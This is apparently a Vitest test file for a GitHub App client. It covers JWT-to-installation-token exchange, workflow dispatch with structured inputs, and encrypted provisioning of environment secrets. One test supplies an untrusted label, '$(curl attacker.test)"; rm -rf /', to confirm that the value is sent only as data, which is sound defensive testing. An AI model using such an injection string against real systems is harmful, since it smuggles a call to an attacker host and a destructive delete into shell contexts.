import type { NormalizedCommand } from '@qali/contracts';
import { createPrivateKey, generateKeyPairSync } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { describe, expect, it, vi } from 'vitest';
import { parse as parseYaml } from 'yaml';
import { GitHubAppClient, createGitHubAppJwt, privateKeyBytes } from './github.js';

function pem(bytes: ArrayBuffer): string {
  const binary = String.fromCharCode(...new Uint8Array(bytes));
  const encoded =
    btoa(binary)
      .match(/.{1,64}/g)
      ?.join('\n') ?? '';
  return `-----BEGIN PRIVATE KEY-----\n${encoded}\n-----END PRIVATE KEY-----`;
}

describe('GitHub App workflow dispatch', () => {
  it('exchanges a JWT for an installation token and sends only structured inputs', async () => {
    const wrangler = JSON.parse(
      readFileSync(new URL('../wrangler.jsonc', import.meta.url), 'utf8')
    ) as {
      vars: { GITHUB_WORKFLOW_FILE: string };
    };
    const workflow = parseYaml(
      readFileSync(new URL('../../../.github/workflows/execute.yml', import.meta.url), 'utf8')
    ) as {
      on: { workflow_dispatch: { inputs: Record<string, unknown> } };
    };
    const keys = await crypto.subtle.generateKey(
      {
        name: 'RSASSA-PKCS1-v1_5',
        modulusLength: 2048,
        publicExponent: new Uint8Array([1, 0, 1]),
        hash: 'SHA-256'
      },
      true,
      ['sign', 'verify']
    );
    const privateKey = pem(await crypto.subtle.exportKey('pkcs8', keys.privateKey));
    const request = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(Response.json({ token: 'installation-token' }))
      .mockResolvedValueOnce(
        Response.json({
          workflow_run_id: 99,
          workflow_run: { id: 99, html_url: 'https://github.test/runs/99' }
        })
      );
    const client = new GitHubAppClient(
      {
        appId: '123',
        privateKey,
        installationId: '456',
        owner: 'qali',
        repo: 'control',
        workflowFile: wrangler.vars.GITHUB_WORKFLOW_FILE,
        ref: 'main',
        apiUrl: 'https://api.github.test'
      },
      request
    );
    const untrusted = '$(curl attacker.test)"; rm -rf /';
    const command: NormalizedCommand = {
      intent: 'run-test-suite',
      project: { id: 'demo', root: 'projects/demo' },
      requestedBy: 'U1',
      externalRole: 'developer',
      receivedAt: new Date().toISOString(),
      parameters: { label: untrusted }
    };

    await expect(client.dispatch(command, 'request-1')).resolves.toEqual({
      runId: '99',
      htmlUrl: 'https://github.test/runs/99'
    });
    const tokenRequest = request.mock.calls[0]!;
    expect(tokenRequest[0]).toBe('https://api.github.test/app/installations/456/access_tokens');
    expect((tokenRequest[1]?.headers as Record<string, string>).authorization).toMatch(
      /^Bearer [^.]+\.[^.]+\.[^.]+$/
    );
    const dispatchRequest = request.mock.calls[1]!;
    expect(dispatchRequest[0]).toContain('/actions/workflows/execute.yml/dispatches');
    const body = JSON.parse(String(dispatchRequest[1]?.body));
    expect(body.return_run_details).toBe(true);
    expect(body.inputs).toEqual({
      request_id: 'request-1',
      correlation_json: '{}',
      project_json: JSON.stringify(command.project),
      intent: command.intent,
      parameters_json: JSON.stringify(command.parameters),
      command_json: JSON.stringify(command)
    });
    expect(Object.keys(body.inputs).sort()).toEqual(
      Object.keys(workflow.on.workflow_dispatch.inputs).sort()
    );
    expect(dispatchRequest[1]).not.toHaveProperty('shell');
    expect(dispatchRequest[1]).not.toHaveProperty('command');
  });

  it('imports GitHub PKCS#1 RSA private keys by wrapping them as PKCS#8', async () => {
    const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
    const pkcs1Pem = privateKey.export({ type: 'pkcs1', format: 'pem' }).toString();
    expect(pkcs1Pem).toContain('BEGIN RSA PRIVATE KEY');
    const jwt = await createGitHubAppJwt('123', pkcs1Pem);
    expect(jwt.split('.')).toHaveLength(3);
    const asPkcs8 = Buffer.from(privateKeyBytes(pkcs1Pem));
    expect(() => createPrivateKey({ key: asPkcs8, format: 'der', type: 'pkcs8' })).not.toThrow();
  });
});

describe('GitHub App environment provisioning', () => {
  it('creates the named environment, writes target variables, and encrypts credential secrets', async () => {
    const keys = await crypto.subtle.generateKey(
      {
        name: 'RSASSA-PKCS1-v1_5',
        modulusLength: 2048,
        publicExponent: new Uint8Array([1, 0, 1]),
        hash: 'SHA-256'
      },
      true,
      ['sign', 'verify']
    );
    const privateKey = pem(await crypto.subtle.exportKey('pkcs8', keys.privateKey));
    const logged: unknown[] = [];
    const error = vi.spyOn(console, 'error').mockImplementation((...args) => {
      logged.push(args);
    });
    const request = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(Response.json({ token: 'installation-token' }))
      .mockResolvedValueOnce(new Response(null, { status: 204 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(Response.json({ key: 'cHVibGlj', key_id: 'key-1' }))
      .mockResolvedValueOnce(new Response(null, { status: 204 }));
    const encrypt = vi.fn(async () => 'ciphertext-for-test');
    const client = new GitHubAppClient(
      {
        appId: '123',
        privateKey,
        installationId: '456',
        owner: 'qali',
        repo: 'control',
        workflowFile: 'execute.yml',
        ref: 'main',
        apiUrl: 'https://api.github.test'
      },
      request,
      encrypt
    );

    await client.provisionProjectEnvironment({
      environment: 'qali-example-com',
      baseUrl: 'https://example.com/',
      allowedOrigins: ['https://example.com'],
      credentialsJson: '{"password":"secret_sauce"}',
      testDataJson: '{"username":"standard_user"}'
    });

    const urls = request.mock.calls.map(([url]) => String(url));
    expect(urls).toEqual([
      'https://api.github.test/app/installations/456/access_tokens',
      'https://api.github.test/repos/qali/control/environments/qali-example-com',
      'https://api.github.test/repos/qali/control/environments/qali-example-com/variables',
      'https://api.github.test/repos/qali/control/environments/qali-example-com/variables',
      'https://api.github.test/repos/qali/control/environments/qali-example-com/variables',
      'https://api.github.test/repos/qali/control/environments/qali-example-com/secrets/public-key',
      'https://api.github.test/repos/qali/control/environments/qali-example-com/secrets/QALI_TEST_CREDENTIALS_JSON'
    ]);
    expect(request.mock.calls[1]?.[1]).toMatchObject({ method: 'PUT' });
    expect(JSON.parse(String(request.mock.calls[2]?.[1]?.body))).toEqual({
      name: 'QALI_TARGET_BASE_URL',
      value: 'https://example.com/'
    });
    expect(JSON.parse(String(request.mock.calls[3]?.[1]?.body))).toEqual({
      name: 'QALI_ALLOWED_ORIGINS_JSON',
      value: '["https://example.com"]'
    });
    expect(JSON.parse(String(request.mock.calls[4]?.[1]?.body))).toEqual({
      name: 'QALI_TEST_DATA_JSON',
      value: '{"username":"standard_user"}'
    });
    expect(encrypt).toHaveBeenCalledWith('{"password":"secret_sauce"}', 'cHVibGlj');
    expect(JSON.parse(String(request.mock.calls[6]?.[1]?.body))).toEqual({
      encrypted_value: 'ciphertext-for-test',
      key_id: 'key-1'
    });
    expect(JSON.stringify(request.mock.calls)).not.toContain('secret_sauce');
    expect(JSON.stringify(logged)).not.toContain('secret_sauce');
    error.mockRestore();
  });

  it('writes empty test-data and credentials defaults when onboard supplies neither', async () => {
    const keys = await crypto.subtle.generateKey(
      {
        name: 'RSASSA-PKCS1-v1_5',
        modulusLength: 2048,
        publicExponent: new Uint8Array([1, 0, 1]),
        hash: 'SHA-256'
      },
      true,
      ['sign', 'verify']
    );
    const privateKey = pem(await crypto.subtle.exportKey('pkcs8', keys.privateKey));
    const request = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(Response.json({ token: 'installation-token' }))
      .mockResolvedValueOnce(new Response(null, { status: 204 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(Response.json({ key: 'cHVibGlj', key_id: 'key-1' }))
      .mockResolvedValueOnce(new Response(null, { status: 204 }));
    const encrypt = vi.fn(async () => 'ciphertext-for-empty');
    const client = new GitHubAppClient(
      {
        appId: '123',
        privateKey,
        installationId: '456',
        owner: 'qali',
        repo: 'control',
        workflowFile: 'execute.yml',
        ref: 'main',
        apiUrl: 'https://api.github.test'
      },
      request,
      encrypt
    );

    await client.provisionProjectEnvironment({
      environment: 'qali-example-com',
      baseUrl: 'https://example.com/',
      allowedOrigins: ['https://example.com']
    });

    expect(JSON.parse(String(request.mock.calls[4]?.[1]?.body))).toEqual({
      name: 'QALI_TEST_DATA_JSON',
      value: '{}'
    });
    expect(encrypt).toHaveBeenCalledWith('{}', 'cHVibGlj');
    expect(JSON.parse(String(request.mock.calls[6]?.[1]?.body))).toEqual({
      encrypted_value: 'ciphertext-for-empty',
      key_id: 'key-1'
    });
  });

  it('seals credentials with the default crypto_box_seal encryptor', async () => {
    const nacl = (await import('tweetnacl')).default;
    const keyPair = nacl.box.keyPair();
    let binary = '';
    for (const byte of keyPair.publicKey) binary += String.fromCharCode(byte);
    const publicKey = btoa(binary);
    const keys = await crypto.subtle.generateKey(
      {
        name: 'RSASSA-PKCS1-v1_5',
        modulusLength: 2048,
        publicExponent: new Uint8Array([1, 0, 1]),
        hash: 'SHA-256'
      },
      true,
      ['sign', 'verify']
    );
    const privateKey = pem(await crypto.subtle.exportKey('pkcs8', keys.privateKey));
    const request = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(Response.json({ token: 'installation-token' }))
      .mockResolvedValueOnce(new Response(null, { status: 204 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(new Response(null, { status: 201 }))
      .mockResolvedValueOnce(Response.json({ key: publicKey, key_id: 'key-1' }))
      .mockResolvedValueOnce(new Response(null, { status: 204 }));
    const client = new GitHubAppClient(
      {
        appId: '123',
        privateKey,
        installationId: '456',
        owner: 'qali',
        repo: 'control',
        workflowFile: 'execute.yml',
        ref: 'main',
        apiUrl: 'https://api.github.test'
      },
      request
    );

    await client.provisionProjectEnvironment({
      environment: 'qali-example-com',
      baseUrl: 'https://example.com/',
      allowedOrigins: ['https://example.com'],
      credentialsJson: '{"password":"secret_sauce"}'
    });

    const secretBody = JSON.parse(String(request.mock.calls[6]?.[1]?.body)) as {
      encrypted_value: string;
    };
    expect(secretBody.encrypted_value).not.toContain('secret_sauce');
    expect(atob(secretBody.encrypted_value).length).toBeGreaterThan(nacl.box.publicKeyLength);
  });
});
